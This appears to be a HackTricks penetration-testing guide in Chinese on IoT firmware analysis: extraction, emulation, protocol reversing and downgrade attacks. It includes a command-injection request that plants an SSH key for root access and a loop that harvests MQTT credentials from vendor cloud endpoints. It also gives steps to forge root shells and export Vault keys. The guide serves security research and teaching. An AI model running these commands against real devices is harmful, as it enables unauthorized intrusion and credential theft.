# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **介绍**

### 相关资源


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware 是确保设备正常运行的 essential software，负责管理硬件组件之间以及硬件与用户交互的软件之间的通信并促进这种通信。它存储在永久性存储器中，确保设备从通电时起即可访问关键指令，并最终启动操作系统。检查并可能修改 Firmware，是识别 security vulnerabilities 的关键步骤。<sup>[[2]](#references)[[3]](#references)</sup>

## **收集信息**

**收集信息** 是了解设备组成及其所使用技术的关键初始步骤。此过程包括收集以下数据：

- 运行的 CPU architecture 和 operating system
- Bootloader 具体信息
- Hardware layout 和 datasheets
- Codebase 指标和 source locations
- External libraries 和 license types
- Update histories 和 regulatory certifications
- Architectural 和 flow diagrams
- Security assessments 及已识别的 vulnerabilities

为此，**open-source intelligence (OSINT)** tools 非常有价值；此外，还可以通过手动和自动化 review processes 分析任何可用的 open-source software components。[Coverity Scan](https://scan.coverity.com) 和 [Semmle’s LGTM](https://lgtm.com/#explore) 等 tools 提供免费的 static analysis，可用于发现潜在问题。

## **获取 Firmware**

可以通过多种方式获取 Firmware，每种方式的复杂程度各不相同：

- 从来源处（developers、manufacturers）**直接获取**
- 根据提供的 instructions **构建**
- 从 official support sites **下载**
- 使用 **Google dork** 查询来查找托管的 firmware files
- 直接访问 **cloud storage**，使用 [S3Scanner](https://github.com/sa7mon/S3Scanner) 等 tools
- 通过 man-in-the-middle techniques 拦截 **updates**
- 通过 **UART**、**JTAG** 或 **PICit** 等 connections 从设备中 **提取**
- 在 device communication 中 **嗅探** update requests
- 识别并使用 **hardcoded update endpoints**
- 从 bootloader 或 network 中 **dump**
- 在其他方法均失败时，使用适当的 hardware tools **移除并读取** storage chip

### 仅 UART 日志：通过 flash 中的 U-Boot env 强制获取 root shell

如果 UART RX 被忽略（仅有日志），仍然可以通过离线**编辑 U-Boot environment blob** 来强制启动 init shell：<sup>[[6]](#references)</sup>

1. 使用 SOIC-8 clip + programmer（3.3V）dump SPI flash：
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. 定位 U-Boot env partition，编辑 `bootargs` 以包含 `init=/bin/sh`，并为该 blob **重新计算 U-Boot env CRC32**。
3. 仅重新刷写 env partition 并重启；UART 上应该会出现 shell。

这对 bootloader shell 已被禁用、但可通过 external flash access 写入 env partition 的 embedded devices 很有用。

## 分析 Firmware

现在你已经**获得 Firmware**，需要提取相关信息，以了解应如何处理它。可以使用不同的 tools 完成此操作：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
如果使用这些工具没有发现太多内容，请使用 `binwalk -E <bin>` 检查镜像的 **entropy**；如果 entropy 较低，那么它不太可能经过加密。如果 entropy 较高，则很可能经过加密（或者以某种方式进行了压缩）。

此外，你可以使用以下工具提取 **firmware 内嵌的文件**：

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

或者使用 [**binvis.io**](https://binvis.io/#/)（[code](https://code.google.com/archive/p/binvis/)）检查文件。

### 获取文件系统

使用前面介绍的工具，例如 `binwalk -ev <bin>`，你应该已经能够**提取文件系统**。\
Binwalk 通常会将其提取到一个**以文件系统类型命名的文件夹**中，通常为以下类型之一：squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs。

#### 手动提取文件系统

有时，binwalk 的 signatures 中**不会包含文件系统的 magic byte**。在这种情况下，请使用 binwalk **查找文件系统的偏移量，并从二进制文件中 carve 出压缩的文件系统**，然后根据其类型，按照以下步骤**手动提取**文件系统。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
运行以下 **dd command** 提取 Squashfs 文件系统。
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
或者，也可以运行以下命令。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- 对于 squashfs（上述示例中使用）

`$ unsquashfs dir.squashfs`

之后，文件将位于 "`squashfs-root`" 目录中。

- CPIO archive 文件

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- 对于 jffs2 文件系统

`$ jefferson rootfsfile.jffs2`

- 对于使用 NAND flash 的 ubifs 文件系统

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 分析 Firmware

获取 Firmware 后，必须对其进行拆解，以了解其结构和潜在漏洞。此过程需要使用各种工具来分析并提取 Firmware image 中的有价值数据。

### 初始分析工具

以下命令用于对 binary 文件（记作 `<bin>`）进行初步检查。这些命令有助于识别文件类型、提取 strings、分析 binary 数据，以及了解 partition 和 filesystem 的详细信息：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
要评估镜像的加密状态，可以使用 `binwalk -E <bin>` 检查其 **entropy**。低 entropy 表明可能未加密，而高 entropy 则表示可能存在加密或压缩。

要提取 **embedded files**，建议使用 **file-data-carving-recovery-tools** 文档等工具和资源，以及用于文件检查的 **binvis.io**。

### 提取文件系统

使用 `binwalk -ev <bin>` 通常可以提取文件系统，提取结果通常位于以文件系统类型命名的目录中（例如 squashfs、ubifs）。但是，当 **binwalk** 因缺少 magic bytes 而无法识别文件系统类型时，就需要手动提取。具体来说，先使用 `binwalk` 定位文件系统的偏移量，然后使用 `dd` 命令 carve 出文件系统：
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
之后，根据文件系统类型（例如 squashfs、cpio、jffs2、ubifs），需要使用不同的命令手动提取其内容。

### 文件系统分析

提取文件系统后，便开始搜索安全漏洞。重点关注不安全的网络守护进程、硬编码凭据、API endpoints、update server 功能、未编译代码、启动脚本，以及用于离线分析的编译二进制文件。

需要检查的**关键位置**和**项目**包括：

- **etc/shadow** 和 **etc/passwd** 中的用户凭据
- **etc/ssl** 中的 SSL certificates 和 keys
- 可能存在漏洞的配置文件和脚本文件
- 用于进一步分析的嵌入式二进制文件
- 常见 IoT 设备的 Web servers 和 binaries

以下工具有助于发现文件系统中的敏感信息和漏洞：

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 和 [**Firmwalker**](https://github.com/craigz28/firmwalker)，用于搜索敏感信息
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)，用于全面的 firmware 分析
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) 和 [**EMBA**](https://github.com/e-m-b-a/emba)，用于静态和动态分析

### 编译二进制文件的安全检查

必须仔细检查文件系统中发现的源代码和编译二进制文件是否存在漏洞。**checksec.sh** 等工具用于 Unix binaries，**PESecurity** 用于 Windows binaries，可帮助识别未受保护、可能被利用的二进制文件。

## 通过派生的 URL tokens 获取 cloud config 和 MQTT 凭据

许多 IoT hubs 从类似以下形式的 cloud endpoint 获取每台设备的配置：<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

在 firmware 分析期间，你可能会发现 `<token>` 是设备通过 hardcoded secret 根据 device ID 在本地派生的，例如：

- token = MD5( deviceId || STATIC_KEY )，并表示为大写十六进制

这种设计使任何获悉 deviceId 和 STATIC_KEY 的人都能重新构造该 URL 并获取 cloud config，而其中通常会暴露明文 MQTT credentials 和 topic prefixes。

实际操作流程：

1) 从 UART boot logs 中提取 deviceId

- 连接 3.3V UART adapter（TX/RX/GND）并捕获 logs：
```bash
picocom -b 115200 /dev/ttyUSB0
```
- 查找打印 cloud config URL pattern 和 broker address 的行，例如：
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) 从 firmware 中恢复 STATIC_KEY 和 token algorithm

- 将 binaries 加载到 Ghidra/radare2 中，并搜索 config path（"/pf/"）或 MD5 usage。
- 确认 algorithm（例如，MD5(deviceId||STATIC_KEY)）。
- 在 Bash 中生成 token，并将 digest 转为大写：
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) 获取 cloud 配置和 MQTT credentials

- 使用 curl 组合 URL 并拉取 JSON；使用 jq 解析以提取 secrets：
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 利用明文 MQTT 和弱 topic ACLs（如果存在）

- 使用恢复的 credentials 订阅 maintenance topics，并查找 sensitive events：
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 枚举可预测的设备 ID（经授权进行大规模操作）

- 许多生态系统会嵌入厂商 OUI、产品和类型字节，后接顺序递增的后缀。
- 可以遍历候选 ID，以编程方式派生 tokens 并获取 configs：
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
笔记
- 在尝试 mass enumeration 之前，始终先获得明确授权。
- 在可能的情况下，优先使用 emulation 或 static analysis，在不修改目标硬件的前提下恢复 secrets。


Firmware emulation 过程可以对设备的运行情况或单个程序进行 **dynamic analysis**。这种方法可能会遇到硬件或架构依赖方面的挑战，但将 root filesystem 或特定 binaries 传输到具有匹配架构和 endianess 的设备（例如 Raspberry Pi），或传输到预先构建的 virtual machine 中，可以促进进一步测试。

### Emulating Individual Binaries

检查单个程序时，确定程序的 endianess 和 CPU architecture 至关重要。

#### Example with MIPS Architecture

要 emulation 一个 MIPS architecture binary，可以使用以下命令：
```bash
file ./squashfs-root/bin/busybox
```
以及安装必要的仿真工具：
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
对于 MIPS（big-endian），使用 `qemu-mips`；对于 little-endian binaries，则应选择 `qemu-mipsel`。

#### ARM Architecture Emulation

对于 ARM binaries，过程类似，使用 `qemu-arm` emulator 进行 emulation。

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 等工具支持完整的 firmware emulation，可自动化该过程并辅助 dynamic analysis。

## Dynamic Analysis in Practice

在此阶段，使用真实或 emulated device environment 进行分析。必须保持对 OS 和 filesystem 的 shell access。Emulation 可能无法完美模拟 hardware interactions，因此有时需要重启 emulation。分析应重新检查 filesystem，利用暴露的 webpages 和 network services，并探索 bootloader vulnerabilities。Firmware integrity tests 对识别潜在的 backdoor vulnerabilities 至关重要。

## Runtime Analysis Techniques

Runtime analysis 涉及在 process 或 binary 的 operating environment 中与其交互，使用 gdb-multiarch、Frida 和 Ghidra 等工具设置 breakpoints，并通过 fuzzing 和其他技术识别 vulnerabilities。

对于没有完整 debugger 的 embedded targets，**将一个 statically-linked `gdbserver` 复制到设备并远程附加**：<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

在 IoT hubs 中，RF stack 通常由 **radio MCU** 和 Linux userland process 分担。一个有用的工作流程是映射以下路径：<sup>[[8]](#references)</sup>

1. 空中的 **RF frame**
2. radio MCU 上的 **controller-side parser**
3. 转发到 Linux 的 **serial/UART text or TLV protocol**（例如 `/dev/tty*`）
4. 主 daemon 中的 **application dispatcher**
5. **protocol-specific handler / state machine**

这种架构会产生两个 reversing targets，而不是一个。如果 controller 将 binary radio frames 转换为类似 `Group,Command,arg1,arg2,...` 的 textual protocol，请恢复：

- **message groups** 和 dispatch tables
- 哪些 messages 可以来自 **network**，哪些只能来自 controller 本身
- 确切的 **manufacturer-specific discriminator fields**（例如 Zigbee `manufacturer_code` 和 custom `cluster_command`）
- 哪些 handlers 只有在 **commissioning**、discovery 或 firmware/model download 阶段才能到达

对于 Zigbee，capture pairing traffic，并检查 target 是否仍依赖默认的 **Link Key** `ZigBeeAlliance09`。如果是这样，sniffing commissioning traffic 可能会暴露 **Network Key**。Zigbee 3.0 install codes 可降低这种暴露，因此应记录被测试 device 是否实际强制执行这些 codes。

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands 通常比 standardized clusters 更适合作为 target，因为它们会进入经过较少实战验证的 **custom parsing code** 和内部 **FSMs**，其 validation 也更少。<sup>[[8]](#references)</sup>

实用工作流程：

- Reverse command dispatcher，直到找到 **vendor-only handler**。
- 恢复 **FSM state**、**event**、**check**、**action** 和 **next-state** tables。
- 识别会自动推进的 **transitional states**，以及最终会 reset 或 free attacker-controlled state 的 retry/error branches。
- 确认需要哪些合法的 protocol exchanges，才能让 daemon 进入 vulnerable state，而不是假设 buggy handler 始终可达。

对于 timing-sensitive protocols，来自 Python framework 的 packet replay 可能过慢。更可靠的方法是在 real hardware（例如 **nRF52840**）上使用 vendor-grade stack 模拟 legitimate device，这样就能暴露正确的 **endpoints**、**attributes** 和 commissioning timing。

### Fragmented-download bug class in embedded daemons

在 **fragmented blob/model/configuration downloads** 中，经常会出现以下 firmware bug class：<sup>[[8]](#references)</sup>

1. **first fragment**（`offset == 0`）存储 `ctx->total_size`，并分配 `malloc(total_size)`。
2. 后续 fragments 只验证 attacker-controlled 的 **packet-local** fields，例如 `packet_total_size >= offset + chunk_len`。
3. copy 使用 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`，却没有检查其是否超出 **original allocated size**。

这使 attacker 能够发送：

- 一个声明 **small** total size 的 first valid fragment，以强制执行 small heap allocation。
- 一个具有 **expected offset** 但 `chunk_len` 更大的 later fragment。
- 一个 forged packet-local size，使其满足新的 checks，同时仍溢出 originally allocated buffer。

当 vulnerable path 位于 commissioning logic 之后时，exploit 必须包含足够的 **device emulation**，先驱动 target 进入预期的 model-download 或 blob-download state，再发送 malformed fragments。

### Protocol-driven `free()` triggers

在 embedded daemons 中，触发 heap metadata exploitation 最简单的方式通常不是“等待 cleanup”，而是**强制使用 protocol 自身的 error handling**：<sup>[[8]](#references)</sup>

- 发送 malformed follow-up fragments，将 FSM 推入 **retry** 或 **error** states。
- 超过 retry threshold，使 daemon **resets context** 并释放 corrupted buffer。
- 利用这个可预测的 `free()`，在 process 因无关原因 crash 之前触发 allocator-side primitives。

这对于 embedded Linux 中的 **musl/uClibc/dlmalloc-like** allocators 尤其有用，因为 corrupting chunk metadata 可以将 unlink/unbin logic 转化为 write primitive。一个稳定的模式是破坏 **size field**，将 allocator traversal 重定向到位于 overflowed buffer 内预先布置的 **fake chunks**，而不是立即覆盖 real bin pointers 并导致 process crash。

## Binary Exploitation and Proof-of-Concept

为已识别的 vulnerabilities 开发 PoC，需要深入理解 target architecture，并使用 lower-level languages 编程。Embedded systems 中的 binary runtime protections 并不常见，但如果存在，可能需要使用 Return Oriented Programming (ROP) 等 techniques。

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation：**uClibc 使用与 glibc 类似的 fastbins。后续的 large allocation 可能触发 `__malloc_consolidate()`，因此任何 fake chunk 都必须通过 checks（合理的 size、`fd = 0`，以及被视为 "in use" 的 surrounding chunks）。<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR：**如果启用了 ASLR，但主 binary 是 **non-PIE**，则 binary 内 `.data/.bss` 的 addresses 是稳定的。可以将 target 指向一个已经类似 valid heap chunk header 的 region，使 fastbin allocation 落到 **function pointer table** 上。
- **Parser-stopping NUL：**解析 JSON 时，payload 中的 `\x00` 可以停止 parsing，同时保留 trailing attacker-controlled bytes，用于 stack pivot/ROP chain。
- **Shellcode via `/proc/self/mem`：**调用 `open("/proc/self/mem")`、`lseek()` 和 `write()` 的 ROP chain，可以将 executable shellcode 写入 known mapping，并跳转到该位置。

## Prepared Operating Systems for Firmware Analysis

诸如 [AttifyOS](https://github.com/adi0x90/attifyos) 和 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 等 operating systems，为 firmware security testing 提供预配置环境，并配备必要的 tools。

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos)：AttifyOS 是一个旨在帮助你对 Internet of Things (IoT) devices 执行 security assessment 和 penetration testing 的 distro。它通过提供一个预配置且加载所有必要 tools 的 environment，为你节省大量时间。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS)：基于 Ubuntu 18.04 的 embedded security testing operating system，预加载了 firmware security testing tools。

## Firmware Downgrade Attacks & Insecure Update Mechanisms

即使 vendor 对 firmware images 实现了 cryptographic signature checks，**version rollback (downgrade) protection 也经常被遗漏**。当 boot-或 recovery-loader 只使用 embedded public key 验证 signature，却不比较待刷入 image 的 *version*（或 monotonic counter）时，attacker 可以合法安装**仍带有有效 signature 的较旧 vulnerable firmware**，从而重新引入已修复的 vulnerabilities。<sup>[[4]](#references)</sup>

典型 attack workflow：

1. **Obtain an older signed image**
* 从 vendor 的 public download portal、CDN 或 support site 获取。
* 从 companion mobile/desktop applications 中提取（例如 Android APK 内 `assets/firmware/` 下的内容）。
* 从 VirusTotal、Internet archives、forums 等 third-party repositories 中获取。
2. 通过任何暴露的 update channel **Upload or serve the image to the device**：
* Web UI、mobile-app API、USB、TFTP、MQTT 等。
* 许多 consumer IoT devices 暴露了*未经 authentication* 的 HTTP(S) endpoints，这些 endpoints 接受 Base64-encoded firmware blobs，在 server-side 解码后触发 recovery/upgrade。
3. Downgrade 后，利用在较新 release 中已修复的 vulnerability（例如后续添加的 command-injection filter）。
4. 获得 persistence 后，可以选择重新 flash latest image，或 disable updates 以避免被发现。

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
在存在漏洞的（降级后的）固件中，`md5` 参数未经清理就直接拼接到 shell 命令中，从而允许注入任意命令（此处用于启用基于 SSH 密钥的 root 访问）。后续固件版本引入了基本的字符过滤，但由于缺少 downgrade protection，该修复实际上无效。<sup>[[4]](#references)</sup>

### 从 Mobile Apps 中提取固件

许多厂商会将完整的固件镜像打包在其配套的 Mobile Apps 中，以便应用通过 Bluetooth/Wi-Fi 更新设备。这些软件包通常以未加密形式存储在 APK/APEX 的 `assets/fw/` 或 `res/raw/` 等路径下。使用 `apktool`、`ghidra`，甚至普通的 `unzip`，即可提取已签名的镜像，而无需接触物理硬件。<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### A/B slot 设计中仅限 updater 的 anti-rollback bypass

一些 vendor 确实实现了 anti-downgrade **ratchet**，但仅存在于 *updater* 逻辑中（例如通过 CAN 运行的 UDS routine、recovery command 或 userspace OTA agent）。如果 **bootloader** 后续只检查 image signature/CRC，并信任 partition table 或 slot metadata，rollback protection 仍然可以被绕过。<sup>[[7]](#references)</sup>

典型的弱设计：

- Firmware metadata 同时包含 version descriptor 和 **security ratchet** / monotonic counter。
- Updater 将 image ratchet 与 persistent storage 中存储的值进行比较，并拒绝较旧的 signed images。
- Bootloader **不解析**该 ratchet，只在启动选定 slot 前验证 header、CRC 和 signature。
- Slot activation 被单独存储在 partition table 或 per-slot generation counter 中，并且**没有以 cryptographic 方式绑定**到已验证的确切 firmware digest。

这会在 dual-slot systems 中产生 **validate-one-image / boot-another-image** primitive。如果 attacker 能够让 updater 使用当前 signed image 将 slot B 标记为下一个 boot target，并能在 reboot 前后覆盖 slot B，那么 bootloader 仍可能启动 downgraded image，因为它只信任已提交的 slot metadata。

常见的滥用模式：

1. 将 **current signed** firmware 上传到 passive slot，并运行正常的 validation/switch routine，使 layout 将该 slot 标记为下一个 active slot。
2. **暂时不要 reboot**。在同一 session 中重新进入 slot-preparation/erase routine。
3. 利用过期的 boot-state 或过期的 slot-selection logic，使 updater 擦除刚刚被 promoted 的**同一物理 slot**。
4. 将**较旧但仍为 signed**的 firmware 写入该 slot。
5. 跳过执行 ratchet 的 validation routine，直接 reboot。
6. Bootloader 选择 promoted slot，只验证 signature/integrity，然后启动旧 image。

逆向 A/B update implementations 时需要关注：

- 从 **boot-time flags** 派生的 slot selection，在 successful switch 后不会刷新。
- 类似 `prepare_passive_slot()` 的 routine 根据 stale state 而不是**当前已提交的 layout**擦除 slot。
- 类似 `part_write_layout()` 的 function 只增加 **generation counter** / active flag，而不存储已验证 image hash。
- Ratchet checks 实现在 userspace 或 updater code 中，但**不在** ROM / bootloader / secure boot stages 中实现。
- Erase 或 recovery routines 在 slot 内容被移除并重写后，仍将该 slot 保持为 bootable。

### 评估 Update Logic 的 Checklist

* *update endpoint* 的 transport/authentication 是否受到充分保护（TLS + authentication）？
* 设备在 flashing 前是否比较 **version numbers** 或 **monotonic anti-rollback counter**？
* Image 是否在 secure boot chain 内完成验证（例如由 ROM code 检查 signatures）？
* **Bootloader 是否执行与 updater 相同的 ratchet**，而不是只检查 signature/CRC？
* Slot activation metadata 是否**绑定到已验证的 firmware digest/version**，还是 slot 在 promotion 后仍可被修改？
* Slot switch 成功后，设备是否被强制 reboot，或者后续的 update/erase routines 在同一 session 中仍可访问？
* Userland code 是否执行额外的 sanity checks（例如 allowed partition map、model number）？
* *Partial* 或 *backup* update flows 是否复用相同的 validation logic？

> 💡  如果上述任一项缺失，该 platform 可能容易受到 rollback attacks 的攻击。

## 用于练习的 Vulnerable firmware

要练习发现 firmware 中的 vulnerabilities，可以以下列 vulnerable firmware projects 作为起点。

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 从 embedded KMS/Vault state 中恢复 firmware decryption keys

当 update image 将少量 plaintext metadata 与大型 high-entropy blob 混合在一起时，应先进行 container triage，而不是立即进行 brute-forcing：<sup>[[1]](#references)</sup>

- 使用 `hexdump`、`xxd`、`strings -tx`、`base64 -d` 和 `binwalk -E` 转储 headers、offsets 和 line boundaries。
- `Salted__` 通常表示 OpenSSL `enc` format：接下来的 8 bytes 是 salt，其余 bytes 是 ciphertext。
- 一个 decode 后恰好为 `256` bytes 的 Base64 field，是其可能为 RSA-2048 ciphertext、用于封装随机 firmware password/session key 的有力提示。
- 同一 file 中的 detached PGP material 通常只负责保护 authenticity；不要假设它是 confidentiality mechanism。

如果 static key hunting（`grep`、`strings`、PEM/PGP searches）失败，应 reverse **operational decrypt path**，而不是只搜索 private keys：

- Decompile updater / management binary，跟踪谁读取 encrypted blob、哪个 helper/API 对其进行 unwrap，以及它请求的 logical key name。
- 在 extracted root filesystem 中搜索 KMS state（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`），以及 unit files 和 init scripts。
- 将 plaintext `vault operator unseal ...`、recovery keys、bootstrap tokens 或 local KMS auto-unseal scripts 视为与 private-key material 等价的内容。

如果 appliance 携带原始 Vault binary 和 storage backend，replay 该 environment 通常比重新实现 Vault internals 更容易：
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
使用 root 权限在克隆的 KMS 上：

- 仅在隔离克隆环境中使 transit keys 可导出：`vault write transit/keys/<name>/config exportable=true`
- 导出 unwrap key：`vault read transit/export/encryption-key/<name>`
- 使用 KMS 所采用的确切 padding/hash 组合测试恢复的 RSA key。PKCS#1 v1.5 解密失败以及默认 OAEP 解密失败，**不能**证明该 key 错误；许多基于 Vault 的流程使用 SHA-256 的 OAEP，而常见库默认使用 SHA-1。
- 如果 payload 以 `Salted__` 开头，请准确复现 vendor 的 OpenSSL KDF（`EVP_BytesToKey`，旧版 appliance 通常使用 MD5），然后再尝试 AES-CBC 解密。

这将“encrypted firmware”转化为一个更通用的问题：**恢复 appliance 端的 operational keys，然后在离线环境中复现确切的 unwrap + KDF 参数**。

## 培训与认证

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [使用 Claude 破解 Firmware：高级别技能，初级别自主性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing 方法论](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking：攻击物联网的权威指南](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [利用被遗弃硬件中的 zero days —— Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [一台 20 美元的 Smart Device 如何让我访问你的 Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Now You See mi：Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv —— 从 Tesla Wall Connector 的充电端口连接器进行 Exploiting —— Part 2：绕过 anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink：Philips Hue Bridge 的 Over-the-Air Exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
